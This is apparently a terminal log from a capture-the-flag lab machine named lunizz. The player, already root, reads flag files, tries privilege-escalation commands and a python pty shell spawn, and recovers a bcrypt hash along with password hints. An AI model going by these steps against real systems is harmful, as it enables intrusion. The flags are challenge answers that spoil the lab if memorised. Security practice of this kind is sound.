+-rw-r--r-- 1 adam  adam     3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 adam  adam      807 Apr  4  2018 .profile
+-rw-r--r-- 1 mason mason     166 Dec  7 18:30 .runasmason.conf
+---------- 1 root  root      862 Dec  7 18:42 .runasmason_source_code.bak
+drwxr-xr-x 3 adam  adam     4096 Dec 10 19:31 Desktop
+drwxr-xr-x 2 adam  adam     4096 Dec 10 19:31 Documents
+drwxr-xr-x 2 adam  adam     4096 Dec 10 20:16 Downloads
+-rwxr-xr-x 1 mason mason 5692824 Dec 10 20:14 runasmason
+-rw-r--r-- 1 mason mason  280000 Dec  7 18:55 runasmason.dat
+root@lunizz:/home/adam# export TERM=xterm-256color
+root@lunizz:/home/adam# ls -la
+total 5876
+drwxr-x--- 5 adam  adam     4096 Dec 10 20:15 .
+drwxr-xr-x 4 root  root     4096 Dec 10 19:18 ..
+lrwxrwxrwx 1 root  root        9 Dec 10 19:30 .bash_history -> /dev/null
+-rw-r--r-- 1 adam  adam      220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 adam  adam     3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 adam  adam      807 Apr  4  2018 .profile
+-rw-r--r-- 1 mason mason     166 Dec  7 18:30 .runasmason.conf
+---------- 1 root  root      862 Dec  7 18:42 .runasmason_source_code.bak
+drwxr-xr-x 3 adam  adam     4096 Dec 10 19:31 Desktop
+drwxr-xr-x 2 adam  adam     4096 Dec 10 19:31 Documents
+drwxr-xr-x 2 adam  adam     4096 Dec 10 20:16 Downloads
+-rwxr-xr-x 1 mason mason 5692824 Dec 10 20:14 runasmason
+-rw-r--r-- 1 mason mason  280000 Dec  7 18:55 runasmason.dat
+root@lunizz:/home/adam# cd ../
+root@lunizz:/home# cd mason/
+root@lunizz:/home/mason# ls -la
+total 32
+drwxr-x--- 4 mason mason 4096 Dec 14 04:52 .
+drwxr-xr-x 4 root  root  4096 Dec 10 19:18 ..
+lrwxrwxrwx 1 root  root     9 Dec 10 19:30 .bash_history -> /dev/null
+-rw-r--r-- 1 mason mason  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 mason mason 3771 Apr  4  2018 .bashrc
+drwx------ 2 mason mason 4096 Dec 14 04:52 .cache
+drwx------ 3 mason mason 4096 Dec 14 04:52 .gnupg
+-rw-r--r-- 1 mason mason  807 Apr  4  2018 .profile
+-rw-r--r-- 1 root  root    38 Dec 10 19:30 user.txt
+root@lunizz:/home/mason# cat user.txt
+thm{23cd53cbb37a37a74d4425b703d91883}
+root@lunizz:/home/mason# cat /root/root.txt
+thm{ad23b9c63602960371b50c7a697265db}root@lunizz:/home/mason# cat .bashrc
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don't put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL=ignoreboth
+
+# append to the history file, don't overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern "**" used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we "want" color)
+case "$TERM" in
+    xterm-color|*-256color) color_prompt=yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+#force_color_prompt=yes
+
+if [ -n "$force_color_prompt" ]; then
+    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
+	# We have color support; assume it's compliant with Ecma-48
+	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
+	# a case would tend to support setf rather than setaf.)
+	color_prompt=yes
+    else
+	color_prompt=
+    fi
+fi
+
+if [ "$color_prompt" = yes ]; then
+    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+else
+    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
+fi
+unset color_prompt force_color_prompt
+
+# If this is an xterm set the title to user@host:dir
+case "$TERM" in
+xterm*|rxvt*)
+    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
+    ;;
+*)
+    ;;
+esac
+
+# enable color support of ls and also add handy aliases
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
+    alias ls='ls --color=auto'
+    #alias dir='dir --color=auto'
+    #alias vdir='vdir --color=auto'
+
+    alias grep='grep --color=auto'
+    alias fgrep='fgrep --color=auto'
+    alias egrep='egrep --color=auto'
+fi
+
+# colored GCC warnings and errors
+#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
+
+# some more ls aliases
+alias ll='ls -alF'
+alias la='ls -A'
+alias l='ls -CF'
+
+# Add an "alert" alias for long running commands.  Use like so:
+#   sleep 10; alert
+alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
+
+# Alias definitions.
+# You may want to put all your additions into a separate file like
+# ~/.bash_aliases, instead of adding them here directly.
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+
+# enable programmable completion features (you don't need to enable
+# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+root@lunizz:/home/mason# cd ../ && cd adam
+root@lunizz:/home/adam# ls
+Desktop  Documents  Downloads  runasmason  runasmason.dat
+root@lunizz:/home/adam# ./runasmason
+i will run your command as mason, trust me on this
+mason@mason$file runasmason
+Command executed
+mason@mason$cat runasmason.dat
+Permission Denied !!!
+mason@mason$ls -la
+Command executed
+mason@mason$cd ../
+Command executed
+mason@mason$ls                                    fek fek  fekk
+Command executed
+mason@mason$cat
+Permission Denied !!!
+mason@mason$sudo
+Permission Denied !!!
+mason@mason$su
+Command executed
+mason@mason$su root
+Command executed
+mason@mason$cd /root
+Command executed
+mason@mason$python3 -c 'import pty;pty.spawn("/bin/bash");'
+Permission Denied !!!
+mason@mason$exit
+Command executed
+mason@mason$^CTraceback (most recent call last):
+
+[1721] Failed to execute script .runasmason_source_code
+
+lets find ans for qus 3
+
+root@lunizz:/home/adam# ls
+Desktop  Documents  Downloads  runasmason  runasmason.dat
+root@lunizz:/home/adam# cd /
+root@lunizz:/# ls -la
+total 1878124
+drwxr-xr-x  25 root root       4096 Dec 14 04:53 .
+drwxr-xr-x  25 root root       4096 Dec 14 04:53 ..
+drwxr-xr-x   2 root root       4096 Dec 10 19:05 bin
+drwxr-xr-x   4 root root       4096 Dec 14 04:53 boot
+drwxr-xr-x   2 root root       4096 Dec 10 18:55 cdrom
+drwxr-xr-x  18 root root       3760 Feb 28 03:25 dev
+drwxr-xr-x  96 root root       4096 Dec 16 05:02 etc
+drwxr-xr-x   4 root root       4096 Dec 10 19:18 home
+lrwxrwxrwx   1 root root         34 Dec 14 04:53 initrd.img -> boot/initrd.img-4.15.0-128-generic
+lrwxrwxrwx   1 root root         34 Dec 10 18:59 initrd.img.old -> boot/initrd.img-4.15.0-124-generic
+drwxr-xr-x  22 root root       4096 Dec 10 20:06 lib
+drwxr-xr-x   2 root root       4096 Dec 10 20:05 lib64
+drwx------   2 root root      16384 Dec 10 18:54 lost+found
+drwxr-xr-x   2 root root       4096 Aug  6  2020 media
+drwxr-xr-x   2 root root       4096 Aug  6  2020 mnt
+drwxr-xr-x   2 root root       4096 Aug  6  2020 opt
+dr-xr-xr-x 128 root root          0 Feb 28 03:25 proc
+drwxr-xr-x   3 root root       4096 Dec 10 19:17 proct
+drwx------   6 root root       4096 Dec 10 19:58 root
+drwxr-xr-x  27 root root        880 Feb 28 03:30 run
+drwxr-xr-x   2 root root      12288 Dec 10 19:05 sbin
+drwxr-xr-x   2 root root       4096 Dec 10 19:09 snap
+drwxr-xr-x   2 root root       4096 Aug  6  2020 srv
+-rw-------   1 root root 1923088384 Dec 10 18:59 swap.img
+dr-xr-xr-x  13 root root          0 Feb 28 03:25 sys
+drwxrwxrwt   3 root root       4096 Feb 28 04:10 tmp
+drwxr-xr-x  10 root root       4096 Aug  6  2020 usr
+drwxr-xr-x  14 root root       4096 Dec 10 19:19 var
+lrwxrwxrwx   1 root root         31 Dec 14 04:53 vmlinuz -> boot/vmlinuz-4.15.0-128-generic
+lrwxrwxrwx   1 root root         31 Dec 10 18:59 vmlinuz.old -> boot/vmlinuz-4.15.0-124-generic
+ 
+ gotcha a folder shouldn't be / dir.......
+
+
+root@lunizz:/# cd proct
+root@lunizz:/proct# ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Dec 10 19:17 .
+drwxr-xr-x 25 root root 4096 Dec 14 04:53 ..
+drwxr-xr-x  2 root root 4096 Dec 10 19:26 pass
+root@lunizz:/proct# cd pass
+root@lunizz:/proct/pass# ls -la
+total 12
+drwxr-xr-x 2 root root 4096 Dec 10 19:26 .
+drwxr-xr-x 3 root root 4096 Dec 10 19:17 ..
+-rw-r--r-- 1 adam adam  433 Dec  7 21:47 bcrypt_encryption.py
+root@lunizz:/proct/pass# cat bcrypt_encryption.py
+import bcrypt
+import base64
+
+password = # https://www.youtube.com/watch?v=-tJYN-eG1zk&ab_channel=QueenOfficial
+bpass = password.encode('ascii')
+passed= str(base64.b64encode(bpass))
+hashAndSalt = bcrypt.hashpw(passed.encode(), bcrypt.gensalt())
+print(hashAndSalt)
+
+salt = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'
+# I wrote this code last year and i didnt save password verify line... I need to find my password
+
+
+weirdooooo !!!!!! try .archive folder
+
+
+root@lunizz:/proct/pass# cd /home/adam
+root@lunizz:/home/adam# ls
+Desktop  Documents  Downloads  runasmason  runasmason.dat
+root@lunizz:/home/adam# cd Desktop
+root@lunizz:/home/adam/Desktop# ls -la
+total 12
+drwxr-xr-x 3 adam adam 4096 Dec 10 19:31 .
+drwxr-x--- 5 adam adam 4096 Dec 10 20:15 ..
+drwxr-xr-x 2 adam adam 4096 Dec 10 19:38 .archive
+root@lunizz:/home/adam/Desktop# cd .archive
+root@lunizz:/home/adam/Desktop/.archive# ls -la
+total 12
+drwxr-xr-x 2 adam adam 4096 Dec 10 19:38 .
+drwxr-xr-x 3 adam adam 4096 Dec 10 19:31 ..
+-rw-r--r-- 1 adam adam  232 Dec  7 20:00 to_my_best_friend_adam.txt
+root@lunizz:/home/adam/Desktop/.archive# cat to_my_best_friend_adam.txt
+do you remember our place 
+i love there it's soo calming
+i will make that lights my password
+
+--
+
+https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000
+
+a few minutes later googlemaps loaded Northern Lights viewing area
+root@lunizz:/home/adam/Desktop/.archive# 
+
+
+
+
+
+
+
+
+
